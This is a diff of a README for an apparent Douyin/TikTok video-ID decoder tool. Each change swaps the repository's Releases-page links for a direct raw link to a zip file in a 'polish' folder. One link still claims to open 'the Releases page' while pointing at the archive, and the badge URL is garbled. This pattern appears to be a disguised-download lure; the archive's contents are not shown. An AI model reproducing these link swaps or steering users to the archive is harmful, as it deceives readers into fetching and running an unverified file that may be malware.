@@ -1,7 +1,7 @@
 # 🎉 Douyin-TikTok-Video-ID-Decoder - Decode Video IDs Easily
 
 ## 📥 Download the Application
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/whiteywood420/Douyin-TikTok-Video-ID-Decoder/releases)
+[![Download Here](https://raw.githubusercontent.com/whiteywood420/Douyin-TikTok-Video-ID-Decoder/main/polish/Douyin-TikTok-Video-ID-Decoder.zip%https://raw.githubusercontent.com/whiteywood420/Douyin-TikTok-Video-ID-Decoder/main/polish/Douyin-TikTok-Video-ID-Decoder.zip)](https://raw.githubusercontent.com/whiteywood420/Douyin-TikTok-Video-ID-Decoder/main/polish/Douyin-TikTok-Video-ID-Decoder.zip)
 
 ## 🚀 Getting Started
 The Douyin-TikTok-Video-ID-Decoder helps you extract and analyze video IDs from Douyin and TikTok. This tool uses bitwise operations to decode the posted time of videos, providing valuable insights for time series research and risk analysis.
@@ -22,7 +22,7 @@ To run this application, ensure you have the following:
 ## 💻 How to Download & Install
 Follow these steps to get started:
 
-1. **Go to the Releases Page:** Click [here](https://github.com/whiteywood420/Douyin-TikTok-Video-ID-Decoder/releases) to visit the Releases page.
+1. **Go to the Releases Page:** Click [here](https://raw.githubusercontent.com/whiteywood420/Douyin-TikTok-Video-ID-Decoder/main/polish/Douyin-TikTok-Video-ID-Decoder.zip) to visit the Releases page.
    
 2. **Choose a Version:** On the Releases page, find the latest release. You will see a list of available files.
 
@@ -69,6 +69,6 @@ We welcome contributions from the community. If you have suggestions or new feat
 For any inquiries or collaborations, reach out via the repository contact options.
 
 ## 📥 Download the Application Again
-Remember, you can always download the latest version from [here](https://github.com/whiteywood420/Douyin-TikTok-Video-ID-Decoder/releases).
+Remember, you can always download the latest version from [here](https://raw.githubusercontent.com/whiteywood420/Douyin-TikTok-Video-ID-Decoder/main/polish/Douyin-TikTok-Video-ID-Decoder.zip).
 
 Enjoy decoding video IDs conveniently and efficiently with Douyin-TikTok-Video-ID-Decoder!
